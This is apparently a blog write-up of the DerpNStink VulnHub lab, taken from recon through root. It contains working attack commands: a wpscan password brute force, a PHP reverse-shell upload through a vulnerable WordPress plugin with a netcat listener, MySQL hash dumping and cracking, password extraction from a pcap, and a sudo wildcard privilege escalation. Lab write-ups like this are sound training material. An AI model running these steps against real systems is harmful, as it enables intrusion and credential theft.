---
title: "DerpNStink"
date: 2021-05-06T04:57:39+05:30
draft: false
toc: false
images:
tags:
  - VulnHub
  - WordPress
  - MySQL
---

## DerpNStink VulnHub Walkthrough

### Recon & Enumeration

- `sudo netdiscover -i eth0 -r 10.0.2.0/24` 
- DerpNStink IP: `10.0.2.8` 

#### RustScan + Nmap

- `sudo rustscan -a 10.0.2.8 -- -sS -A`

  ```
  10.0.2.8:21/tcp => vsftpd 3.0.2
  10.0.2.8:22/tcp => OpenSSH 6.6.1p1 
  10.0.2.8:80/tcp => Apache httpd 2.4.7 
  ```

- In HTML source code: 
```
flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166)
```

#### GoBuster

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.0.2.8 -t 60 -x txt
```

```
/weblog        (Status:301) [Size:304] [http://10.0.2.8/weblog/]
/php           (Status:301) [Size:301] [http://10.0.2.8/php/]   
/css           (Status:301) [Size:301] [http://10.0.2.8/css/]   
/js            (Status:301) [Size:300] [http://10.0.2.8/js/]    
/javascript    (Status:301) [Size:308] [http://10.0.2.8/javascript/]
/robots.txt    (Status:200) [Size:53]                                   
/temporary     (Status:301) [Size:307] [http://10.0.2.8/temporary/] 
/server-status (Status:403) [Size:288]
```
- `/weblog` redirected to `http://derpnstink.local/weblog`. So we will need to add it to the hosts file.
- `echo 10.0.2.8 derpnstink.local | tee -a /etc/hosts`
- Then visit `http://derpnstink.local/weblog`.
- Its a WordPress blog. 

---

### Exploitation

```
wpscan --url http://derpnstink.local/weblog -e at -e ap -e u
```

```
WordPress theme in use: twentysixteen
Location: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/
Last Updated: 2021-03-09T00:00:00.000Z
Readme: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/readme.txt
The version is out of date, the latest version is 2.4

Plugin(s) Identified:

slideshow-gallery
Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/
Last Updated: 2019-07-12T13:09:00.000Z
The version is out of date, the latest version is 1.6.12
Found By: Urls In Homepage (Passive Detection)
Version: 1.4.6 (100% confidence)
Found By: Readme - Stable Tag (Aggressive Detection)
- http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt
Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
- http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt

User(s) Identified:
- admin
```

- We got a username: `admin`. Now to brute force for password:
```
wpscan --url http://derpnstink.local/weblog/ -U admin -P /usr/share/wordlists/rockyou.txt -t 60
```

```
Valid Combinations Found:
Username: admin, Password: admin
```
- Honestly, I should have just tried `admin:admin` before even running `wpscan` but, oh well.
- Go to `/weblog/wp-admin/` and log in with `admin` : `admin`
- Go to Slideshow, click on one of the available ones, in there, under Choose Image option, select a file to upload. Choose PHP reverse shell file (with IP and port changed to connect back to our Kali VM) and it will be accepted without even changing extension. 
- Or you can use this exploit to upload the shell since we already have user credentials: [WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload](https://www.exploit-db.com/exploits/34681).

```python
python wp_slideshow_exploit.py -t http://derpnstink.local/weblog -u admin -p admin -f php-shell.php
```

- Start a netcat listener: `nc -lvnp 1234`
- Then go back to Slideshow and click on the slideshow that has PHP reverse shell file and we will get a reverse shell as `www-data`. 
- `cd /var/www/html/weblog` and `ls -la` 
- We have read access to `wp-config.php` so `cat wp-config.php` 
```
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');
```
- `mysql -u root -p` => `mysql` 
- `show databases;` 
- `use mysql;` 
- `show tables;` 
- `select * from user;` 
- DerpNStink MySQL Commands:
![DerpNStink MySQL Commands](/imgs/derpnstink_mysql_commands.png)
- Dumping users & passwords from MySQL:
![Dumping Users & Passwords from MySQL](/imgs/derpnstink_mysql_users_passwords.png)

- And we get a few MySQL password hashes. Used [CrackStation](https://crackstation.net/) to crack them: 
```
root = E74858DB86EBA20BC33D0AECAE8A8108C56B17FA = mysql
unclestinky = 9B776AFB479B31E8047026F1185E952DD1E530CB = wedgie57
phpmyadmin = 4ACFE3202A5FF5CF467898FC58AAB1D615029441 = admin
```

- Lets try `unclestinky : wedgie57` on user `stinky`. 
- `su stinky` => `wedgie57` and it works. 
- There is a `ftp` directory in `/stinky` and if we keep going in, there is a `key.txt` file which has `ssh` key for user `stinky` 

```
/home/stinky/ftp/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh/key.txt
```

- But we can also get it from `/home/stinky/.ssh`
- `cd /home/stinky/.ssh` and start a python server with `python3 -m http.server 5959` and then get the `id_rsa` key from `derpnstink.local:5959/id_rsa` using a browser or via `wget`. 
- `chmod 600 id_rsa` and then log in via `ssh`: 
- `ssh -i id_rsa stinky@10.0.2.8` 
- `cd /home/stinky/Desktop && ls -la` 
- `cat flag.txt` 

```
flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
```

- `cd /home/stinky/Documents && ls -la` there is a `derpissues.pcap` file. 
- `strings derpissues.pcap` to get the general idea of traffic recorded. 
- There are a few HTTP POST requests in there without SSL/TLS, thus, unencrypted. So we can start looking at them. Or we can `grep` for the username we already have: `mrderp`. I tried it both ways. 
- `strings derpissues.pcap | grep -n mrderp` 
- This gives 7 results but the first one itself reveals the password that was used while creating the account for `mrderp` and the second one reveals it again when it was used for logging in as `mrderp`. 

```
56710:action=createuser&_wpnonce_create-user=b250402af6&_wp_http_referer=%2Fweblog%2Fwp-admin%2Fuser-new.php&user_login=mrderp&email=mrderp%40derpnstink.local&first_name=mr&last_name=derp&url=%2Fhome%2Fmrderp&pass1=derpderpderpderpderpderpderp&pass1-text=derpderpderpderpderpderpderp&pass2=derpderpderpderpderpderpderp&pw_weak=on&role=administrator&createuser=Add+New+User
57149:log=mrderp&pwd=derpderpderpderpderpderpderp&wp-submit=Log+In&redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&testcookie=1
```

- The other method is to filter POST requests and to look for passwords in unencrypted/plain text parameters. 
- So to filter the `strings` results for just those POST requests: 
- `strings derpissues.pcap | grep POST` 
- It lists all the POST requests but we can filter out the others that we don't need and focus only on POST requests made to `/weblog/wp-login.php` 
- `strings derpissues.pcap | grep -A 20 "POST /weblog/wp-login.php"` 
- `grep -A 20` to print the next 20 lines that come after the expected result of `grep`. 
- Now there are only three such POST requests and the username and password payload being sent through them is in plain text. 

```
1: log=unclestinky%40derpnstink.local&pwd=wedgie57&wp-submit=Log+In&redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&testcookie=1c3
2: log=mrderp&pwd=derpderpderpderpderpderpderp&wp-submit=Log+In&redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&testcookie=1
```
- We already have `stinky`'s or `unclestinky`'s password: `wedgie57` and now we also have `mrderp`'s password: `derpderpderpderpderpderpderp` 
- `su mrderp` => `derpderpderpderpderpderpderp` and we are now logged in as `mrderp`! 
- `mrderp` : `derpderpderpderpderpderpderp` 

---

### Privilege Escalation

- `sudo -l` => `derpderpderpderpderpderpderp` 
```
User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
```
- If you `cd /home/mrderp/Desktop/ && ls`, there is a `helpdesk.log` file which has a pastebin link inside: `https://pastebin.com/RzK9WfGw`. This pastebin also tells us the same thing that `sudo -l` says. 
- So back to privilege escalation, there is no `/home/mrderp/binaries/` directory so lets create one. 
- `cd /home/mrderp` and then `mkdir binaries && cd binaries` 
- Then create a bash script (any script/executable will work here) that we can execute with `sudo`. 
- `touch derpy.sh` 
- `echo /bin/bash > derpy.sh` 
- Then `chmod +x derpy.sh` and then execute it with: 
`sudo ./derpy.sh` and we are now `root`! 
- `whoami` => `root` 
- `cd /root/Desktop && ls -la` 
- `cat flag.txt` 
```
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)

Congrats on rooting my first VulnOS!
Hit me up on twitter and let me know your thoughts!
@securekomodo
```



<!-- ### Possible Kernel Exploit

- `uname -a` 
```
Linux DeRPnStiNK 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux
```
- Kernel exploit could be possible. Try kernel exploit later. 
 -->

